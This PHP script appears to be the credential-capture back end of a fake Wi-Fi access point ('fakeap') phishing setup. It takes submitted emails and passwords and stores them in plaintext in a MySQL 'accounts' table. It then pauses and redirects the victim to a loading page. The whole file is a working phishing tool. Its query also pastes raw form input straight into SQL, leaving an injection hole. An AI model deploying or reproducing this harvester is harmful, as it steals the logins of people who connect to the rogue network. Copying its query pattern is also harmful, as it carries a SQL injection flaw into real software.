<?php
session_start();
ob_start();
$host="localhost";
$username="user";
$pass="password";
$dbname="fakeap";
$tbl_name="accounts";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if ($conn) {
    $email=$_POST['email'];
    $password=$_POST['password'];

	$sql = "INSERT INTO accounts (email, password) VALUES ('$email', '$password')";
	if (mysqli_query($conn, $sql)) {
        	echo "New record created successfully";
	} else {
    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}

	mysqli_close($conn);
}

sleep(2);
header("location:loading.html");
ob_end_flush();
?>